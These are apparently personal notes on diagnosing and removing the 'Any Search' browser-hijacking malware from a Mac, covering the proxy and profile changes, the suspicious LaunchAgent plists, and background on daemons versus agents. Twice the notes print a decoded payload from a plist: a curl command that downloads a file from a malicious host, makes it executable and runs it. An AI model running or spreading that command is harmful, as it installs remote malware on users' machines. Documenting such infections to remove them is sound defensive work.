# Any Search Malware

Recently was troubleshooting a browser issue on my Sister's laptop. Despite never having explicitly reset her Chrome browser's default search engine, it had been set to search.anysearch.net.

Looking into this took me down the rabbit hole. Here's what I found ...

Observations:

- Slow webpage loading, inspite of a stable WiFi connectopm.
- Some websites completely blocked from loading. "No Internet" message rendered.
- In *System Preferences/Network/Advanced Settings*, I could see the the SOCKS proxy setting was turned on. Switched it back on. Going back to this page I can see that it's been turned on.
- Suspicious profiles set in *System Preferences/Profiles*
- Suspicious plist files in 


- *com.FEE56CE7.09A9.43F1.8B77.FDDB6B8323B5.plist* contains base64 obsfucated code that evaluates to this:
  - `tmp="$(mktemp /tmp/XXXXXXXX)"; curl --retry 5 -f "http://api.processerfilter.com/plg?u=7F94125F-B398-516C-952D-CBC0071EEAEF" -o "${tmp}"; if [[ -s "${tmp}" ]]; then chmod 777 "${tmp}"; "${tmp}"; fi; rm "${tmp}" | /bin/zsh`
  - These URL links give more info. First link suggests that it is malicious:      
    - https://hybrid-analysis.com/sample/ae0c9fbf1b12dbb76e4c2e891a7cb36025b93137e6d36b27487794825e4c9203?environmentId=100
    - https://www.threatcrowd.org/domain.php?domain=api.processerfilter.com

- Followed these steps outline in this website [any-search-removal](https://www.pcrisk.com/removal-guides/11494-searchanysearchcom-redirect-mac) to remove this malware from the laptop
  - These involved search for and removing suspicous files in and `/Library/LaunchAgents`, `~/Library/LaunchAgents`, and `/Library/Application Support`. Note that no files were found in `~/Library/LaunchAgents`. Flles that were found have been included in this directory.
  - 

- Found loads of suspect executables in `/Library/Application Support` and `~/Library/Application Support`. 
  - Deleted them, didn't try to analyse them.
  - This one stood out as the most suspicious to me:
    - `/Library/Application Support/com.TotalProjectSearchDaemon/TotalProjectSearch` (a UNIX executable)

- What is a PLIST file?
  - A PLIST file is a settings file, also known as a "properties file," used by macOS applications. It contains properties and configuration settings for various programs. PLIST files are formatted in XML and based on Apple's Core Foundation DTD.

- Laucn Daemons vs Launch Agents
  - Unix-based operating systems have daemons or computer programs that run as a background process and not directly under the interactive user’s session. This is a boon for admins as they can leverage daemons to perform any series of tasks and is particularly useful when paired with repetitive maintenance tasks that run on a schedule. By setting up daemons to perform these tasks, admins can ensure that these programs run automatically at the system level, so as not to be interrupted by user sessions or input.
  - Agents share a great deal of similarity with daemons in that they both run computer programs in an automated fashion on target devices. However, daemons execute these tasks at the system-level, while agents execute these tasks within the context of the user’s interactive session. Both are useful and powerful in their own right, but each has its own specific use cases and should be treated as such to prevent tasks that rely on system-level access from being executed in the user’s space where they may not have the necessary rights to perform the tasks properly.
  - https://www.techrepublic.com/article/macos-know-the-difference-between-launch-agents-and-daemons-and-use-them-to-automate-processes/

## Cool finding

- *com.FEE56CE7.09A9.43F1.8B77.FDDB6B8323B5.plist* contains obsfucated code that evaluates to this:
  - `tmp="$(mktemp /tmp/XXXXXXXX)"; curl --retry 5 -f "http://api.processerfilter.com/plg?u=7F94125F-B398-516C-952D-CBC0071EEAEF" -o "${tmp}"; if [[ -s "${tmp}" ]]; then chmod 777 "${tmp}"; "${tmp}"; fi; rm "${tmp}" | /bin/zsh`
  - These URL links give more info. First link suggests that it is malicious:      
    - https://hybrid-analysis.com/sample/ae0c9fbf1b12dbb76e4c2e891a7cb36025b93137e6d36b27487794825e4c9203?environmentId=100
    - https://www.threatcrowd.org/domain.php?domain=api.processerfilter.com
